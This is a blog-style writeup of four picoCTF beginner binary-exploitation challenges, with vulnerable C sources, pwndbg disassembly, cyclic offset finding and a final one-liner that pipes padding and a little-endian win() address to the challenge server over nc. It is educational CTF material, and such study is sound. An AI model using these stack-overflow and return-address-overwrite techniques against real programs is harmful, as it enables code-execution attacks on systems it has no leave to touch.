---
layout: post
title: "Low Level Binary Intro Playlist by picoCTF Writeup"
date: 2025-11-17
tags: 
    - asm
    - revEng 
    - low-level 
    - CTF 
    - buffer-overflows
---

# 0xm0t0k0

WELCOME :D
I've been busy! Busy solving buffer overflows in picoCTF's Low Level Binary Intro playlist and reading the legendary paper **Smashing The Stack For Fun And Profit**. 
Buffer overflows are a foundational topic that once you understand are like the scales on the violin, painful to play at first and mostly bad executed as well, but then as you get better you can advance into real art or in our case **more advanced memory exploitation topics** :3 Soo, without further ado, let's go to the first challenge in the **Binary Exploitation** list, called **Picker IV**.

We have source and it looks like this:
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

```
So we understand that in order to get the flag we need to trigger the win() function.
All we need to do is input the functions address and the programm will jump right to it.
All we need to do is load the binary into pwndbg, disassemble win function, and :
pwndbg> disass win
Dump of assembler code for function win:
   0x000000000040129e <+0>:	endbr64
   0x00000000004012a2 <+4>:	push   rbp
   0x00000000004012a3 <+5>:	mov    rbp,rsp
   0x00000000004012a6 <+8>:	sub    rsp,0x10
   0x00000000004012aa <+12>:	lea    rdi,[rip+0xd74]        # 0x402025
   0x00000000004012b1 <+19>:	call   0x4010f0 <puts@plt>
   0x00000000004012b6 <+24>:	lea    rsi,[rip+0xd71]        # 0x40202e
   0x00000000004012bd <+31>:	lea    rdi,[rip+0xd6c]        # 0x402030
   0x00000000004012c4 <+38>:	call   0x401150 <fopen@plt>
   0x00000000004012c9 <+43>:	mov    QWORD PTR [rbp-0x10],rax
   0x00000000004012cd <+47>:	cmp    QWORD PTR [rbp-0x10],0x0
   ...
   ... #here is the rest of the assembly that we do not care abt
```
Okay, we have the address of the func its the very first ```asm 0x000000000040129e ``` 
We input the address into the program and voilà : 
```bash
You input 0x40129e
You won!
picoCTF{DIY}
```
Okie-dokie then, let's take a sip of some yummy coffee and continue our little lockpicking into programs

Next challenge is buffer overflow 0

the source code is
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
And by taking a look we see some red flags immediately *clears throat* on ```gets()```, on magic numbers in ```buf1```, ```buf2```, on ```strcpy()```. 
But lets model it properly:
The Buffer Overflow Chain:

In ```main()```:

```char buf1[100]``` is declared (100 bytes)
```gets(buf1)``` reads user input aand has NO bounds checking, so you can input more than 100 bytes though we will shortly see less will be enough


Passed to ```vuln()```:

```vuln(buf1)``` is called with whatever we inserted


In ```vuln()``` function:

```char buf2[16]``` is declared (some magic and some number = catastrophe)
```strcpy(buf2, input)``` copies from input into buf2
```strcpy()``` also has aalso no bounds checking, it just copies until it finds a null terminator (\0)

So all we need to input is enough bytes to cause a crash. I'll let you figure out how much 0.<

We now graduate to "Local Target"
where we are asked to overflow the buffer and modify the other local variable.

```c
#include <stdio.h>
#include <stdlib.h>



int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}
```

Here I discovered two approaches: one (more nerdy and prone to error) and one that uses something called DeBruijn sequence.

What we need to do is find out exactly how many "padding" we need to insert into our vulnerable input[] array. First though would be 17, and that does corrupt the buffer but it does not alter the value stored in the num variable's memory location, it's like breaking a glass into a house but only checking the entry hall.My initial approach was to see exactly where in memory resided input and num and then calculate how many *steps* in our case **bytes** i would need to access num's memory location. 
Here is the disassembly:

```
Dump of assembler code for function main:
   0x0000000000401236 <+0>:    endbr64
   0x000000000040123a <+4>:    push   rbp
   0x000000000040123b <+5>:    mov    rbp,rsp
   0x000000000040123e <+8>:    sub    rsp,0x20 
   0x0000000000401242 <+12>:    mov    DWORD PTR [rbp-0x8],0x40 #num is at 0x8
   0x0000000000401249 <+19>:    lea    rdi,[rip+0xdb4]        # 0x402004
   0x0000000000401250 <+26>:    mov    eax,0x0
   0x0000000000401255 <+31>:    call   0x4010f0 <printf@plt>
   0x000000000040125a <+36>:    mov    rax,QWORD PTR [rip+0x2e0f]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x0000000000401261 <+43>:    mov    rdi,rax
   0x0000000000401264 <+46>:    call   0x401120 <fflush@plt>
   0x0000000000401269 <+51>:    lea    rax,[rbp-0x20] #here wesee that input[] buffer is at 0x20
   0x000000000040126d <+55>:    mov    rdi,rax
   0x0000000000401270 <+58>:    mov    eax,0x0
   0x0000000000401275 <+63>:    call   0x401110 <gets@plt>
   0x000000000040127a <+68>:    mov    edi,0xa
   0x000000000040127f <+73>:    call   0x4010c0 <putchar@plt>
   0x0000000000401284 <+78>:    mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000401287 <+81>:    mov    esi,eax
   0x0000000000401289 <+83>:    lea    rdi,[rip+0xd85]        # 0x402015
   0x0000000000401290 <+90>:    mov    eax,0x0
   0x0000000000401295 <+95>:    call   0x4010f0 <printf@plt>
   0x000000000040129a <+100>:    mov    rax,QWORD PTR [rip+0x2dcf]        # 0x404070 <stdout@@GLIBC_2.2.5>
```
so 0x20 - 0x8 = 0x18 = 24 bytes of padding then all we need is to write value of 65 in hex and once again 
we have a flag.

The other way is by fuzzing to find when the buffer is overwritten by using unique 4-byte values (De Bruijn sequence) to check in the EIP when exactly the buffer got corrupted. It is way easier and less prone to calculation mistakes. Another very easy to solve is the recommended solution in the picoCTF site where it proposes a similar approach but more simplified(using the alphabet).


Now for the last one: we are asked to control the return address, aka corrupt the buffer and input our own address, though now it is more nuanced as we have to enter the address ourselves (it won't be handled automatically like with the one that we just input the address).

First the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

as you can see win() is never called and is not after a vulnerable function, meaning we need to manually call it from its memory address. By fuzzing with a De Bruijn sequence we can find out just how much padding will be needed to overflow the buffer and overwrite the eip register allowing us to execute the function we want, in classic ret2win fashion. We also need to find the exact address of the function by running:
```bash
pwndbg> disass win
```

```
Dump of assembler code for function win:
   0x080491f6 <+0>:	endbr32                #This is what interests us
   0x080491fa <+4>:	push   ebp
   0x080491fb <+5>:	mov    ebp,esp
   0x080491fd <+7>:	push   ebx
   0x080491fe <+8>:	sub    esp,0x54
   #rest of assembler dump
```
okidoki, so we note that address 0x080491f6. We also should consider that x86_64 architecture uses little-endian byte ordering, meaning the least significant byte of an integer is stored at the lowest memory address, so in our example that would look \xf6\x91\x04\x08 + the enter character (\x0a) to execute it (i found out about that the hard way, bc I was feeding the correct address and the program was just segfaulting and exiting without executing the win func). 

we have the address ദ്ദി ˉ͈̀꒳ˉ͈́ )✧ all we need now is finding just how much padding we will need.
i am using pwndbg, which has a neat little command called ```cyclic``` that produces a DeBruijn sequence and also is able to track it. Let me show you:
```bash
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

#we copy paste this
#then we run the program and input this string
pwndbg> run
Starting program: /home/m0t0k0/ctf/Challs/LowLevel/BinaryExploitation/BufferOverflows/bufferoverflow1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/nix/store/rcp9sdrrq8sfxkm5zdykglx7hd2gzbfy-glibc-2.40-66/lib/libthread_db.so.1".
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────
 EAX  0x41
 EBX  0x6161616a ('jaaa')
 ECX  0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_local_ro) ◂— 0
 ESI  0x8049350 (__libc_csu_init) ◂— endbr32
 EBP  0x6161616b ('kaaa')
 ESP  0xffff8b20 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 EIP  0x6161616c ('laaa')
───────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────
Invalid address 0x6161616c










────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ esp 0xffff8b20 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0004│     0xffff8b24 ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0008│     0xffff8b28 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:000c│     0xffff8b2c ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0010│     0xffff8b30 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0014│     0xffff8b34 ◂— 'raaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0018│     0xffff8b38 ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:001c│     0xffff8b3c ◂— 'taaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► 0 0x6161616c None
   1 0x6161616d None
   2 0x6161616e None
   3 0x6161616f None
   4 0x61616170 None
   5 0x61616171 None
   6 0x61616172 None
   7 0x61616173 None
─────────────────────────────────────────────────────────────────────────────────────────────────────────
#we see that it crashed which is what we wanted₍^ >⩊< ^₎Ⳋ now we just have to look at the instruction pointer register

pwndbg> info registers eip
eip            0x6161616c          0x6161616c

#we see that the register contains the value 0x6161616c which maps to an exact sequence of character of our#sequence, but it would be tedious work to try and search and count ourselves. That's where cylic comes in #handy

pwndbg> cyclic -l 0x6161616c
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44 #and we have our padding :3
```

So use ```info registers eip + cyclic -l``` -> to get the padding

Then we have to find a way to input the address without the terminal interpreting our input as characters.
If we try to just input our address after 44 bytes of padding into the challs interactive terminal, we won't find any luck. So we need to make a command that sends raw bytes:
```python
python3 -c "import sys; sys.stdout.buffer.write(b"PADDING\xf6\x91\x04\x08\x0a") | nc saturn.picoctf.net port
```

when you hit enter and get the flag, remember that feeling **for me it's the best thing**

understanding buffer overflows deeply and intuitively will help you graduate into even more interesting and difficult techniques, something i am also trying to self-learn, and it is so worth it when you finally get it and understand what's going on.

as always, 0xm0t0k0 signing out 0.<


